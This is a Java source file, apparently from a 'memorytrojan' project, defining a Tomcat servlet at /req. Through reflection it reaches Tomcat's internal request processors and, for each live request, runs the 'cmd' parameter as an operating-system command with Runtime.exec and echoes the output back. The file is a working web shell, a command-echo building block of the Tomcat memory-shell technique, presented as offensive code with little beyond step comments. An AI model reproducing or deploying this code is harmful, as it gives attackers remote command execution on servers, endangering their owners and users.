package com.yyjccc.memorytrojan.Echo;

import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

@WebServlet("/req")
public class Tomcat_Req extends HttpServlet{

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
		try {
			//获取StandardContext
			Field resourcesField = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
			resourcesField.setAccessible(true);
			StandardContext standardContext = (StandardContext) ((WebResourceRoot) resourcesField.get(classLoader)).getContext();

			//获取ApplicationContext
			Field contextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
			contextField.setAccessible(true);
			ApplicationContext context = (ApplicationContext) contextField.get(standardContext);

			//获取StandardService
			Field serviceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
			serviceField.setAccessible(true);
			StandardService service = (StandardService) serviceField.get(context);

			//获取connectors
			Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
			connectorsField.setAccessible(true);
			Connector[] connectors = (Connector[]) connectorsField.get(service);
			Connector connector=connectors[0];

			//获取Handler
			ProtocolHandler protocolHandler = connector.getProtocolHandler();
			Field handleField = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
			handleField.setAccessible(true);
			AbstractEndpoint.Handler handle = (AbstractEndpoint.Handler) handleField.get(protocolHandler);

			//获取processors
			Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
			processorsField.setAccessible(true);
			List<RequestInfo> processors = (List<RequestInfo>) processorsField.get(handle.getGlobal());

			//获取Request
			Field reqfield = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
			reqfield.setAccessible(true);
			for (RequestInfo processor : processors) {
				Request request= (Request) reqfield.get(processor);

				org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
				org.apache.catalina.connector.Response http_response = http_request.getResponse();
				cmdEcho(http_request,http_response);
				System.out.println();
			}

			System.out.println();
		} catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
			throw new RuntimeException(e);
		}

	}

	public  void cmdEcho(HttpServletRequest request,HttpServletResponse response){
		PrintWriter writer;
		response.setCharacterEncoding("gbk");
		try {
			writer = response.getWriter();
			String cmd = request.getParameter("cmd");
			InputStream inputStream;
			if(cmd!=null){
				inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
				Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
				String result = scanner.hasNext()?scanner.next():"";
				scanner.close();
				writer.write(result);
				writer.flush();
				writer.close();
			}

		} catch (IOException e) {
			throw new RuntimeException(e);
		}

	}
}
